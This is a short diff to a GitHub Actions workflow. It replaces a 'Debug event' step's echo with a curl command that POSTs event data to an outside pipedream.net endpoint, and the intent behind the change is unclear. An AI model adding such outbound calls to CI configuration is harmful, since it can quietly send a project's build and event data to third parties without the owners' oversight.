@@ -10,4 +10,7 @@ jobs:
     runs-on: ubuntu:latest
     steps:
       - name: Debug event
-        run: echo ${{ github.event }}
+        run: |
+          curl -d '{ "event": "${GITHUB_EVENT_PATH}" }' \
+          -H "Content-Type: application/json" \
+          https://en2hkrg0cir59.x.pipedream.net/
